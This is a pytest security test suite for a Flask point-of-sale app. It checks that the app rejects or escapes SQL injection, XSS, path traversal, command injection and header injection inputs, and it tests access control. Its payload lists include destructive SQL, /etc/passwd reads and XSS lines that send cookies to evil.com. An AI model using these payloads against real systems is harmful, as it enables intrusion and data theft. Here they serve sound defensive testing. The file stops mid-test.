"""
Comprehensive Security Tests for Sunnat Collection POS System.

This module contains security-focused tests covering:
1. SQL Injection - Tests against all database queries
2. XSS (Cross-Site Scripting) - Tests on all user inputs
3. CSRF Protection - Verification of token requirements
4. Authentication Bypass - Attempts to bypass login
5. Session Hijacking - Session security tests
6. Privilege Escalation - Role-based access control tests
7. Path Traversal - File access security tests
8. Command Injection - Input sanitization tests
9. IDOR (Insecure Direct Object References) - Access control tests
10. Password Security - Brute force and weak password tests

Author: Security Testing Suite
"""

import pytest
import json
import time
import uuid
import re
from datetime import datetime, date, timedelta
from decimal import Decimal
from urllib.parse import urlencode, quote
from unittest.mock import patch, MagicMock

from flask import session, g
from flask_login import current_user

from app import create_app, db
from app.models import (
    User, Product, Category, Sale, SaleItem, Customer,
    Location, LocationStock, StockMovement, StockTransfer, StockTransferItem,
    Setting, ActivityLog
)
# Helper functions for authentication
def login_user(client, username, password):
    """Helper function to log in a user."""
    return client.post('/auth/login', data={
        'username': username,
        'password': password
    }, follow_redirects=True)

def logout_user(client):
    """Helper function to log out a user."""
    return client.get('/auth/logout', follow_redirects=True)


# =============================================================================
# SECURITY PAYLOAD DEFINITIONS
# =============================================================================

# SQL Injection Payloads - Various techniques
SQL_INJECTION_PAYLOADS = [
    # Classic SQL injection
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "'; DROP TABLE users; --",
    "'; DELETE FROM users; --",
    "'; UPDATE users SET role='admin' WHERE '1'='1'; --",
    "1' OR '1'='1",
    "1; DROP TABLE products; --",

    # Union-based injection
    "' UNION SELECT * FROM users --",
    "' UNION SELECT username, password_hash FROM users --",
    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
    "' UNION ALL SELECT NULL,NULL,NULL --",

    # Blind SQL injection
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND SLEEP(5) --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "1' AND SUBSTRING(username,1,1)='a' --",

    # Error-based injection
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password_hash FROM users LIMIT 1))) --",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",

    # Time-based blind injection
    "'; WAITFOR DELAY '0:0:5' --",
    "' OR IF(1=1, SLEEP(5), 0) --",
    "1' AND SLEEP(5) AND '1'='1",

    # Stacked queries
    "'; INSERT INTO users VALUES ('hacker', 'hacked@test.com', 'pass', 'admin'); --",
    "1; UPDATE users SET is_global_admin=1 WHERE username='cashier'; --",

    # Bypassing filters
    "' OR ''='",
    "' OR 'x'='x",
    "' OR 1=1#",
    "admin'--",
    "' oR '1'='1",
    "' OR '1'='1'/*",
    "') OR ('1'='1",
    "' AND '1'='1",

    # NULL byte injection
    "%00' OR '1'='1",
    "admin\x00'--",

    # Double encoding
    "%27%20OR%20%271%27%3D%271",

    # Special characters
    "\\",
    "\\\\",
    "\\x00",
    "\\n",
]

# XSS Payloads - Various attack vectors
XSS_PAYLOADS = [
    # Basic script injection
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>document.location='http://evil.com/?c='+document.cookie</script>",

    # Event handlers
    "<img src=x onerror=alert('XSS')>",
    "<img src='x' onerror='alert(document.cookie)'>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<video src=x onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<iframe src='javascript:alert(1)'>",

    # JavaScript protocol
    "javascript:alert('XSS')",
    "javascript:alert(document.cookie)",
    "<a href='javascript:alert(1)'>click</a>",
    "<a href=javascript:alert('XSS')>link</a>",

    # Data URLs
    "<a href='data:text/html,<script>alert(1)</script>'>click</a>",
    "<object data='data:text/html,<script>alert(1)</script>'>",

    # Encoded payloads
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror='&#97;&#108;&#101;&#114;&#116;(1)'>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",

    # Filter bypass
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<script/src='http://evil.com/xss.js'>",
    "<script type='text/javascript'>alert('XSS')</script>",
    "<<script>script>alert('XSS')<</script>/script>",

    # Style-based XSS
    "<style>@import 'javascript:alert(1)';</style>",
    "<div style='background:url(javascript:alert(1))'>",
    "<div style='width:expression(alert(1))'>",

    # Template injection
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "#{alert(1)}",

    # Unicode encoding
    "\u003cscript\u003ealert('XSS')\u003c/script\u003e",

    # HTML entity encoding
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",

    # SVG-based XSS
    "<svg><script>alert('XSS')</script></svg>",
    "<svg/onload=alert('XSS')>",

    # Breaking out of attributes
    "' onclick='alert(1)",
    "\" onfocus=\"alert(1)\" autofocus=\"",
    "' onfocus='alert(1)' autofocus='",
]

# Path Traversal Payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "/etc/passwd%00.jpg",
    "../../../etc/passwd\x00.jpg",
    "....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "..\\..\\..\\..\\..\\..\\etc\\passwd",
    ".../.../.../etc/passwd",
    "....\\....\\....\\etc\\passwd",
    "/var/www/../../../etc/passwd",
    "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=../../../etc/passwd",
]

# Command Injection Payloads
COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "&& id",
    "|| echo vulnerable",
    "; sleep 5",
    "| sleep 5",
    "`id`",
    "$(id)",
    "$(`id`)",
    "'; exec master..xp_cmdshell 'ping 127.0.0.1' --",
    "| ping -c 4 127.0.0.1",
    "\n/bin/cat /etc/passwd",
    "%0a id",
    "%0aid",
    "{{''.__class__.__mro__[2].__subclasses__()}}",  # SSTI
]

# HTTP Header Injection Payloads
HEADER_INJECTION_PAYLOADS = [
    "test\r\nX-Injected: header",
    "test\nX-Injected: header",
    "test\r\nSet-Cookie: malicious=cookie",
    "test%0d%0aX-Injected: header",
    "test\r\n\r\n<script>alert(1)</script>",
]


# =============================================================================
# SQL INJECTION TESTS
# =============================================================================

class TestSQLInjection:
    """SQL Injection security tests."""

    @pytest.mark.security
    def test_login_sql_injection_username(self, client, db_session):
        """Test SQL injection in login username field."""
        for payload in SQL_INJECTION_PAYLOADS[:20]:  # Test a subset for speed
            response = client.post('/auth/login', data={
                'username': payload,
                'password': 'password123'
            }, follow_redirects=True)

            # Should not cause server error
            assert response.status_code in [200, 302, 400]
            # Should not grant access
            assert b'Dashboard' not in response.data or b'Login' in response.data

    @pytest.mark.security
    def test_login_sql_injection_password(self, client, db_session):
        """Test SQL injection in login password field."""
        for payload in SQL_INJECTION_PAYLOADS[:20]:
            response = client.post('/auth/login', data={
                'username': 'admin',
                'password': payload
            }, follow_redirects=True)

            assert response.status_code in [200, 302, 400]
            # SQL injection should not bypass authentication
            assert b'Invalid username or password' in response.data or b'Login' in response.data

    @pytest.mark.security
    def test_product_search_sql_injection(self, client, admin_user, db_session):
        """Test SQL injection in product search."""
        login_user(client, 'admin_test', 'Admin123!')

        for payload in SQL_INJECTION_PAYLOADS[:15]:
            response = client.get(f'/pos/search-products?q={quote(payload)}')

            # Should not cause server error
            assert response.status_code in [200, 400]

            if response.status_code == 200:
                data = response.get_json()
                # Should return empty or valid products, not database errors
                assert 'products' in data or 'error' in data

    @pytest.mark.security
    def test_customer_search_sql_injection(self, client, admin_user, db_session):
        """Test SQL injection in customer search."""
        login_user(client, 'admin_test', 'Admin123!')

        for payload in SQL_INJECTION_PAYLOADS[:15]:
            response = client.get(f'/customers/search?q={quote(payload)}')

            assert response.status_code in [200, 400]

            if response.status_code == 200:
                data = response.get_json()
                assert 'customers' in data or 'error' in data

    @pytest.mark.security
    def test_inventory_filter_sql_injection(self, client, admin_user, db_session):
        """Test SQL injection in inventory filters."""
        login_user(client, 'admin_test', 'Admin123!')

        for payload in SQL_INJECTION_PAYLOADS[:10]:
            # Test category filter
            response = client.get(f'/inventory/?category={quote(payload)}')
            assert response.status_code in [200, 302, 400]

            # Test search filter
            response = client.get(f'/inventory/?search={quote(payload)}')
            assert response.status_code in [200, 302, 400]

            # Test supplier filter
            response = client.get(f'/inventory/?supplier={quote(payload)}')
            assert response.status_code in [200, 302, 400]

    @pytest.mark.security
    def test_sale_list_date_filter_sql_injection(self, client, admin_user, db_session):
        """Test SQL injection in sales date filters."""
        login_user(client, 'admin_test', 'Admin123!')

        for payload in SQL_INJECTION_PAYLOADS[:10]:
            response = client.get(f'/pos/sales?from_date={quote(payload)}&to_date={quote(payload)}')
            assert response.status_code in [200, 302, 400]

    @pytest.mark.security
    def test_transfer_search_sql_injection(self, client, admin_user, db_session):
        """Test SQL injection in transfer product search."""
        login_user(client, 'admin_test', 'Admin123!')

        for payload in SQL_INJECTION_PAYLOADS[:10]:
            response = client.get(f'/transfers/api/search-products?source_id=1&q={quote(payload)}')
            assert response.status_code in [200, 400]


# =============================================================================
# XSS (CROSS-SITE SCRIPTING) TESTS
# =============================================================================

class TestXSS:
    """Cross-Site Scripting security tests."""

    @pytest.mark.security
    def test_customer_name_xss(self, client, admin_user, db_session):
        """Test XSS prevention in customer name field."""
        login_user(client, 'admin_test', 'Admin123!')

        for payload in XSS_PAYLOADS[:15]:
            response = client.post('/customers/add', data={
                'name': payload,
                'phone': '03001234567',
                'email': 'test@test.com',
                'customer_type': 'regular'
            }, follow_redirects=True)

            # Script tags should be escaped or rejected
            assert b'<script>' not in response.data
            assert b'onerror=' not in response.data
            assert b'javascript:' not in response.data

    @pytest.mark.security
    def test_product_name_xss(self, client, admin_user, category, db_session):
        """Test XSS prevention in product name field."""
        login_user(client, 'admin_test', 'Admin123!')

        for payload in XSS_PAYLOADS[:15]:
            response = client.post('/inventory/add', data={
                'code': f'XSS-{uuid.uuid4().hex[:8]}',
                'name': payload,
                'category_id': category.id,
                'cost_price': '100',
                'selling_price': '200',
                'quantity': '10'
            }, follow_redirects=True)

            # Verify XSS payloads are escaped in response
            assert b'<script>alert' not in response.data
            assert b"onerror='alert" not in response.data

    @pytest.mark.security
    def test_sale_notes_xss(self, client, cashier_user, product, kiosk_stock, db_session):
        """Test XSS prevention in sale notes."""
        login_user(client, 'cashier_test', 'Cashier123!')

        for payload in XSS_PAYLOADS[:10]:
            response = client.post('/pos/complete-sale',
                data=json.dumps({
                    'items': [{
                        'product_id': product.id,
                        'quantity': 1,
                        'unit_price': 100,
                        'subtotal': 100
                    }],
                    'subtotal': 100,
                    'total': 100,
                    'payment_method': 'cash',
                    'amount_paid': 100,
                    'notes': payload
                }),
                content_type='application/json'
            )

            if response.status_code == 200:
                data = response.get_json()
                assert '<script>' not in str(data)

    @pytest.mark.security
    def test_customer_notes_xss(self, client, admin_user, db_session):
        """Test XSS prevention in customer notes field."""
        login_user(client, 'admin_test', 'Admin123!')

        for payload in XSS_PAYLOADS[:10]:
            response = client.post('/customers/add', data={
                'name': 'Test Customer',
                'phone': f'0300{uuid.uuid4().hex[:7]}',
                'notes': payload
            }, follow_redirects=True)

            assert b'<script>alert' not in response.data

    @pytest.mark.security
    def test_product_description_xss(self, client, admin_user, category, db_session):
        """Test XSS prevention in product description."""
        login_user(client, 'admin_test', 'Admin123!')

        for payload in XSS_PAYLOADS[:10]:
            response = client.post('/inventory/add', data={
                'code': f'DESC-{uuid.uuid4().hex[:8]}',
                'name': 'Test Product',
                'description': payload,
                'category_id': category.id,
                'cost_price': '100',
                'selling_price': '200',
                'quantity': '10'
            }, follow_redirects=True)

            assert b'<script>alert' not in response.data

    @pytest.mark.security
    def test_settings_xss(self, client, admin_user, db_session):
        """Test XSS prevention in business settings."""
        login_user(client, 'admin_test', 'Admin123!')

        for payload in XSS_PAYLOADS[:10]:
            response = client.post('/settings/business/update', data={
                'business_name': payload,
                'business_address': payload,
                'business_phone': '1234567890'
            }, follow_redirects=True)

            assert b'<script>alert' not in response.data

    @pytest.mark.security
    def test_transfer_notes_xss(self, client, manager_user, warehouse, kiosk, db_session):
        """Test XSS prevention in transfer notes."""
        login_user(client, 'manager_test', 'Manager123!')

        for payload in XSS_PAYLOADS[:10]:
            response = client.post('/transfers/create', data={
                'source_location_id': warehouse.id,
                'priority': 'normal',
                'notes': payload
            }, follow_redirects=True)

            assert b'<script>alert' not in response.data


# =============================================================================
# CSRF PROTECTION TESTS
# =============================================================================

class TestCSRF:
    """CSRF protection verification tests."""

    @pytest.fixture
    def csrf_enabled_app(self):
        """Create app with CSRF enabled."""
        app = create_app()
        app.config['WTF_CSRF_ENABLED'] = True
        app.config['TESTING'] = True
        app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///:memory:'
        app.config['SECRET_KEY'] = 'test-secret-key'

        with app.app_context():
            db.create_all()
            yield app
            db.session.rollback()
            db.drop_all()

    @pytest.mark.security
    def test_login_without_csrf_token(self, csrf_enabled_app):
        """Test that login requires CSRF token when enabled."""
        with csrf_enabled_app.test_client() as client:
            response = client.post('/auth/login', data={
                'username': 'admin',
                'password': 'password123'
            })
            # Without CSRF token, should fail with 400 or redirect
            assert response.status_code in [200, 302, 400]

    @pytest.mark.security
    def test_state_changing_operations_check_referer(self, client, admin_user, db_session):
        """Test that state-changing operations validate properly."""
        login_user(client, 'admin_test', 'Admin123!')

        # Attempt to delete user without proper session context
        response = client.post('/settings/users/delete/1',
            headers={'Referer': 'http://evil.com'})

        # Should either reject or handle gracefully
        assert response.status_code in [200, 302, 400, 403, 404]


# =============================================================================
# AUTHENTICATION BYPASS TESTS
# =============================================================================

class TestAuthenticationBypass:
    """Authentication bypass attempt tests."""

    @pytest.mark.security
    def test_direct_access_protected_routes(self, client, db_session):
        """Test that protected routes cannot be accessed without login."""
        protected_routes = [
            '/pos/',
            '/inventory/',
            '/customers/',
            '/settings/',
            '/settings/users',
            '/reports/',
            '/transfers/',
            '/warehouse/',
            '/production/',
        ]

        for route in protected_routes:
            response = client.get(route)
            # Should redirect to login
            assert response.status_code in [302, 401, 403]

    @pytest.mark.security
    def test_api_endpoints_require_auth(self, client, db_session):
        """Test that API endpoints require authentication."""
        api_routes = [
            '/pos/search-products?q=test',
            '/pos/complete-sale',
            '/customers/search?q=test',
            '/transfers/api/search-products?source_id=1&q=test',
        ]

        for route in api_routes:
            response = client.get(route)
            assert response.status_code in [302, 401, 403]

    @pytest.mark.security
    def test_inactive_user_cannot_login(self, client, inactive_user, db_session):
        """Test that inactive users cannot log in."""
        response = client.post('/auth/login', data={
            'username': 'inactive_test',
            'password': 'Inactive123!'
        }, follow_redirects=True)

        assert b'deactivated' in response.data.lower() or b'login' in response.data.lower()

    @pytest.mark.security
    def test_session_not_created_on_failed_login(self, client, db_session):
        """Test that failed login doesn't create a session."""
        response = client.post('/auth/login', data={
            'username': 'nonexistent',
            'password': 'wrongpassword'
        }, follow_redirects=True)

        with client.session_transaction() as sess:
            assert '_user_id' not in sess

    @pytest.mark.security
    def test_login_with_empty_credentials(self, client, db_session):
        """Test login with empty credentials."""
        response = client.post('/auth/login', data={
            'username': '',
            'password': ''
        }, follow_redirects=True)

        # Should fail gracefully
        assert response.status_code in [200, 400]
        assert b'Invalid' in response.data or b'required' in response.data.lower()

    @pytest.mark.security
    def test_login_with_null_bytes(self, client, admin_user, db_session):
        """Test login with null byte injection."""
        response = client.post('/auth/login', data={
            'username': 'admin_test\x00injected',
            'password': 'Admin123!'
        }, follow_redirects=True)

        # Should not authenticate
        assert b'Invalid' in response.data or response.status_code == 400


# =============================================================================
# SESSION HIJACKING TESTS
# =============================================================================

class TestSessionSecurity:
    """Session hijacking and security tests."""

    @pytest.mark.security
    def test_session_cookie_httponly(self, client, admin_user, db_session):
        """Test that session cookie has HttpOnly flag."""
        response = client.post('/auth/login', data={
            'username': 'admin_test',
            'password': 'Admin123!'
        })

        if 'Set-Cookie' in response.headers:
            cookie_header = response.headers.get('Set-Cookie', '')
            # Session cookie should have HttpOnly flag
            if 'session=' in cookie_header:
                assert 'HttpOnly' in cookie_header

    @pytest.mark.security
    def test_session_invalidation_on_logout(self, client, admin_user, db_session):
        """Test that session is invalidated on logout."""
        # Login
        login_user(client, 'admin_test', 'Admin123!')

        # Verify logged in
        response = client.get('/pos/')
        assert response.status_code in [200, 302]

        # Logout
        client.get('/auth/logout', follow_redirects=True)

        # Try accessing protected route
        response = client.get('/pos/', follow_redirects=False)
        assert response.status_code == 302  # Redirect to login

    @pytest.mark.security
    def test_session_fixation_prevention(self, client, admin_user, db_session):
        """Test that session ID changes after login."""
        # Get initial session
        initial_response = client.get('/auth/login')

        with client.session_transaction() as sess:
            initial_session_data = dict(sess)

        # Login
        login_user(client, 'admin_test', 'Admin123!')

        # Session should be different after login
        # (Flask regenerates session on login by default)
        with client.session_transaction() as sess:
            assert '_fresh' in sess or 'user_id' in sess or '_user_id' in sess

    @pytest.mark.security
    def test_concurrent_session_handling(self, client, admin_user, db_session):
        """Test concurrent session handling."""
        # First login
        response1 = login_user(client, 'admin_test', 'Admin123!')

        # Second login (simulating another browser)
        with client.application.test_client() as client2:
            response2 = login_user(client2, 'admin_test', 'Admin123!')

            # Both sessions should be valid (or one should be invalidated)
            # This test checks the system handles it gracefully
            assert response1.status_code in [200, 302]
            assert response2.status_code in [200, 302]


# =============================================================================
# PRIVILEGE ESCALATION TESTS
# =============================================================================

class TestPrivilegeEscalation:
    """Privilege escalation security tests."""

    @pytest.mark.security
    def test_cashier_cannot_access_admin_settings(self, client, cashier_user, db_session):
        """Test that cashier cannot access admin settings."""
        login_user(client, 'cashier_test', 'Cashier123!')

        admin_routes = [
            '/settings/',
            '/settings/users',
            '/settings/users/add',
            '/settings/business',
            '/settings/activity-log',
        ]

        for route in admin_routes:
            response = client.get(route, follow_redirects=True)
            # Should be denied or redirected
            assert b'permission' in response.data.lower() or \
                   b'denied' in response.data.lower() or \
                   b'not authorized' in response.data.lower() or \
                   response.status_code in [403, 302]

    @pytest.mark.security
    def test_cashier_cannot_manage_users(self, client, cashier_user, admin_user, db_session):
        """Test that cashier cannot create or modify users."""
        login_user(client, 'cashier_test', 'Cashier123!')

        # Try to add user
        response = client.post('/settings/users/add', data={
            'username': 'hacker',
            'email': 'hacker@test.com',
            'password': 'Hacker123!',
            'full_name': 'Hacker',
            'role': 'admin'
        }, follow_redirects=True)

        assert b'permission' in response.data.lower() or response.status_code in [403, 302]

        # Verify user was not created
        hacker = User.query.filter_by(username='hacker').first()
        assert hacker is None

    @pytest.mark.security
    def test_cashier_cannot_delete_users(self, client, cashier_user, admin_user, db_session):
        """Test that cashier cannot delete users."""
        login_user(client, 'cashier_test', 'Cashier123!')

        response = client.post(f'/settings/users/delete/{admin_user.id}')

        # Should be forbidden
        assert response.status_code in [302, 403]

    @pytest.mark.security
    def test_manager_role_boundaries(self, client, manager_user, admin_user, db_session):
        """Test that manager cannot perform admin-only actions."""
        login_user(client, 'manager_test', 'Manager123!')

        # Managers should not be able to create admins
        response = client.post('/settings/users/add', data={
            'username': 'new_admin',
            'email': 'newadmin@test.com',
            'password': 'NewAdmin123!',
            'full_name': 'New Admin',
            'role': 'admin',
            'is_global_admin': 'on'
        }, follow_redirects=True)

        assert b'permission' in response.data.lower() or response.status_code in [403, 302]

    @pytest.mark.security
    def test_role_tampering_in_request(self, client, cashier_user, db_session):
        """Test that role cannot be escalated through request tampering."""
        login_user(client, 'cashier_test', 'Cashier123!')

        # Try to update own role via API
        response = client.post(f'/settings/users/edit/{cashier_user.id}', data={
            'role': 'admin',
            'is_global_admin': 'on'
        }, follow_redirects=True)

        # Should not have permission
        assert response.status_code in [302, 403]

        # Verify role wasn't changed
        db.session.refresh(cashier_user)
        assert cashier_user.role == 'cashier'
        assert cashier_user.is_global_admin == False


# =============================================================================
# IDOR (INSECURE DIRECT OBJECT REFERENCES) TESTS
# =============================================================================

class TestIDOR:
    """Insecure Direct Object Reference security tests."""

    @pytest.mark.security
    def test_access_other_location_sales(self, client, cashier_user, kiosk, warehouse, db_session):
        """Test that user cannot access sales from other locations."""
        # Create a sale at a different location
        other_kiosk = Location(
            name='Other Kiosk',
            code='KS-OTHER',
            location_type='kiosk',
            is_active=True
        )
        db.session.add(other_kiosk)
        db.session.commit()

        other_sale = Sale(
            sale_number='SALE-OTHER-001',
            user_id=cashier_user.id,
            location_id=other_kiosk.id,
            subtotal=1000.00,
            total=1000.00,
            payment_method='cash',
            status='completed'
        )
        db.session.add(other_sale)
        db.session.commit()

        # Login as cashier at original kiosk
        login_user(client, 'cashier_test', 'Cashier123!')

        # Try to access sale from other location
        response = client.get(f'/pos/sale-details/{other_sale.id}')

        # Depending on implementation, should either:
        # - Return 404/403
        # - Filter out the sale
        assert response.status_code in [200, 302, 403, 404]

    @pytest.mark.security
    def test_modify_other_location_stock(self, client, cashier_user, product, kiosk, warehouse, db_session):
        """Test that user cannot modify stock at other locations."""
        # Create stock at different location
        other_kiosk = Location(
            name='Other Kiosk 2',
            code='KS-OTHER2',
            location_type='kiosk',
            is_active=True
        )
        db.session.add(other_kiosk)
        db.session.commit()

        other_stock = LocationStock(
            product_id=product.id,
            location_id=other_kiosk.id,
            quantity=100
        )
        db.session.add(other_stock)
        db.session.commit()

        login_user(client, 'cashier_test', 'Cashier123!')

        # Try to adjust stock at other location
        response = client.post(f'/inventory/adjust-stock/{product.id}',
            data=json.dumps({
                'adjustment_type': 'add',
                'quantity': 50,
                'reason': 'IDOR test'
            }),
            content_type='application/json'
        )

        # Should not affect other location's stock
        db.session.refresh(other_stock)
        assert other_stock.quantity == 100

    @pytest.mark.security
    def test_access_other_user_data(self, client, cashier_user, admin_user, db_session):
        """Test that user cannot access other user's data directly."""
        login_user(client, 'cashier_test', 'Cashier123!')

        # Try to access admin user edit page
        response = client.get(f'/settings/users/edit/{admin_user.id}')

        # Should be forbidden
        assert response.status_code in [302, 403]

    @pytest.mark.security
    def test_sequential_id_enumeration(self, client, admin_user, db_session):
        """Test protection against ID enumeration."""
        login_user(client, 'admin_test', 'Admin123!')

        # Try to enumerate customer IDs
        valid_responses = 0
        for customer_id in range(1, 100):
            response = client.get(f'/customers/view/{customer_id}')
            if response.status_code == 200:
                valid_responses += 1

        # Should handle non-existent IDs gracefully (404)
        # This test verifies the application doesn't expose internal errors

    @pytest.mark.security
    def test_transfer_access_control(self, client, manager_user, warehouse, kiosk, db_session):
        """Test that users can only access their location's transfers."""
        # Create another kiosk and transfer
        other_kiosk = Location(
            name='Other Kiosk 3',
            code='KS-OTHER3',
            location_type='kiosk',
            parent_warehouse_id=warehouse.id,
            is_active=True
        )
        db.session.add(other_kiosk)
        db.session.commit()

        other_transfer = StockTransfer(
            transfer_number='TRF-OTHER-001',
            source_location_id=warehouse.id,
            destination_location_id=other_kiosk.id,
            status='pending'
        )
        db.session.add(other_transfer)
        db.session.commit()

        login_user(client, 'manager_test', 'Manager123!')

        # Try to access transfer for other location
        response = client.get(f'/transfers/{other_transfer.id}')

        # Should either deny or show limited view
        assert response.status_code in [200, 302, 403, 404]


# =============================================================================
# PATH TRAVERSAL TESTS
# =============================================================================

class TestPathTraversal:
    """Path traversal security tests."""

    @pytest.mark.security
    def test_file_upload_path_traversal(self, client, admin_user, category, db_session):
        """Test path traversal in file upload."""
        login_user(client, 'admin_test', 'Admin123!')

        for payload in PATH_TRAVERSAL_PAYLOADS[:10]:
            # Create a fake file with malicious filename
            from io import BytesIO
            data = {
                'code': f'PATH-{uuid.uuid4().hex[:8]}',
                'name': 'Test Product',
                'category_id': category.id,
                'cost_price': '100',
                'selling_price': '200',
                'quantity': '10',
                'image': (BytesIO(b'fake image data'), payload)
            }

            response = client.post('/inventory/add',
                data=data,
                content_type='multipart/form-data',
                follow_redirects=True
            )

            # Should not cause server error
            assert response.status_code in [200, 302, 400]

    @pytest.mark.security
    def test_report_path_traversal(self, client, admin_user, db_session):
        """Test path traversal in report file access."""
        login_user(client, 'admin_test', 'Admin123!')

        for payload in PATH_TRAVERSAL_PAYLOADS[:10]:
            # Try to access files outside web root
            response = client.get(f'/static/{payload}')

            # Should return 404, not file contents
            assert response.status_code in [400, 403, 404]


# =============================================================================
# COMMAND INJECTION TESTS
# =============================================================================

class TestCommandInjection:
    """Command injection security tests."""

    @pytest.mark.security
    def test_product_code_command_injection(self, client, admin_user, category, db_session):
        """Test command injection in product code."""
        login_user(client, 'admin_test', 'Admin123!')

        for payload in COMMAND_INJECTION_PAYLOADS[:10]:
            response = client.post('/inventory/add', data={
                'code': payload,
                'name': 'Test Product',
                'category_id': category.id,
                'cost_price': '100',
                'selling_price': '200',
                'quantity': '10'
            }, follow_redirects=True)

            # Should handle gracefully
            assert response.status_code in [200, 302, 400]

    @pytest.mark.security
    def test_backup_command_injection(self, client, admin_user, db_session):
        """Test command injection in backup operations."""
        login_user(client, 'admin_test', 'Admin123!')

        # If there's a backup endpoint that takes user input
        for payload in COMMAND_INJECTION_PAYLOADS[:10]:
            response = client.post('/settings/backup', data={
                'filename': payload
            }, follow_redirects=True)

            # Should handle gracefully
            assert response.status_code in [200, 302, 400, 404, 405]


# =============================================================================
# PASSWORD SECURITY TESTS
# =============================================================================

class TestPasswordSecurity:
    """Password security and brute force protection tests."""

    @pytest.mark.security
    def test_weak_password_rejection(self, client, admin_user, db_session):
        """Test that weak passwords are rejected."""
        login_user(client, 'admin_test', 'Admin123!')

        weak_passwords = [
            '123',
            'abc',
            'pass',
            '12345',
            'password',
        ]

        for weak_password in weak_passwords:
            response = client.post('/auth/change-password', data={
                'current_password': 'Admin123!',
                'new_password': weak_password,
                'confirm_password': weak_password
            }, follow_redirects=True)

            # Weak passwords should be rejected
            assert b'6 characters' in response.data or b'weak' in response.data.lower() or \
                   b'password' in response.data.lower()

    @pytest.mark.security
    def test_password_mismatch_rejection(self, client, admin_user, db_session):
        """Test that password confirmation must match."""
        login_user(client, 'admin_test', 'Admin123!')

        response = client.post('/auth/change-password', data={
            'current_password': 'Admin123!',
            'new_password': 'NewPassword123!',
            'confirm_password': 'DifferentPassword123!'
        }, follow_redirects=True)

        assert b'do not match' in response.data

    @pytest.mark.security
    def test_wrong_current_password_rejection(self, client, admin_user, db_session):
        """Test that wrong current password is rejected."""
        login_user(client, 'admin_test', 'Admin123!')

        response = client.post('/auth/change-password', data={
            'current_password': 'WrongPassword',
            'new_password': 'NewPassword123!',
            'confirm_password': 'NewPassword123!'
        }, follow_redirects=True)

        assert b'incorrect' in response.data.lower()

    @pytest.mark.security
    def test_brute_force_protection(self, client, admin_user, db_session):
        """Test protection against brute force login attempts."""
        # Attempt multiple failed logins
        for i in range(10):
            response = client.post('/auth/login', data={
                'username': 'admin_test',
                'password': f'WrongPassword{i}'
            }, follow_redirects=True)

        # The system should still function (not crash)
        # and ideally implement rate limiting or lockout
        assert response.status_code in [200, 302, 429]

    @pytest.mark.security
    def test_password_not_in_response(self, client, admin_user, db_session):
        """Test that password hash is not exposed in responses."""
        login_user(client, 'admin_test', 'Admin123!')

        # Check various endpoints
        endpoints = [
            '/settings/users',
            f'/settings/users/edit/{admin_user.id}',
        ]

        for endpoint in endpoints:
            response = client.get(endpoint, follow_redirects=True)
            # Password hash should not be in response
            assert b'password_hash' not in response.data
            assert admin_user.password_hash.encode() not in response.data


# =============================================================================
# HTTP HEADER INJECTION TESTS
# =============================================================================

class TestHeaderInjection:
    """HTTP header injection security tests."""

    @pytest.mark.security
    def test_header_injection_in_redirect(self, client, db_session):
        """Test header injection in redirect URLs."""
        for payload in HEADER_INJECTION_PAYLOADS:
            response = client.get(f'/auth/login?next={quote(payload)}')

            # Should not inject headers
            assert response.status_code in [200, 302, 400]
            if 'X-Injected' in response.headers:
                pytest.fail("Header injection vulnerability detected")

    @pytest.mark.security
    def test_crlf_injection(self, client, admin_user, db_session):
        """Test CRLF injection prevention."""
        login_user(client, 'admin_test', 'Admin123!')

        # Try CRLF injection in various inputs
        crlf_payloads = [
            "test%0d%0aSet-Cookie: malicious=1",
            "test\r\nX-Injected: header",
            "test\nX-Injected: header",
        ]

        for payload in crlf_payloads:
            response = client.get(f'/customers/search?q={payload}')

            # Should not inject headers
            assert 'X-Injected' not in response.headers


# =============================================================================
# INPUT VALIDATION TESTS
# =============================================================================

class TestInputValidation:
    """Input validation security tests."""

    @pytest.mark.security
    def test_numeric_fields_validation(self, client, admin_user, category, db_session):
        """Test that numeric fields reject non-numeric input."""
        login_user(client, 'admin_test', 'Admin123!')

        invalid_numbers = ['abc', '<script>', '1e308', 'NaN', 'Infinity', '-Infinity']

        for invalid in invalid_numbers:
            response = client.post('/inventory/add', data={
                'code': f'NUM-{uuid.uuid4().hex[:8]}',
                'name': 'Test Product',
                'category_id': category.id,
                'cost_price': invalid,
                'selling_price': '200',
                'quantity': '10'
            }, follow_redirects=True)

            # Should handle gracefully
            assert response.status_code in [200, 302, 400]

    @pytest.mark.security
    def test_date_fields_validation(self, client, admin_user, category, db_session):
        """Test that date fields validate properly."""
        login_user(client, 'admin_test', 'Admin123!')

        invalid_dates = [
            'not-a-date',
            '2024-13-45',  # Invalid month/day
            '9999-99-99',
            '<script>alert(1)</script>',
            '; DROP TABLE products; --',
        ]

        for invalid_date in invalid_dates:
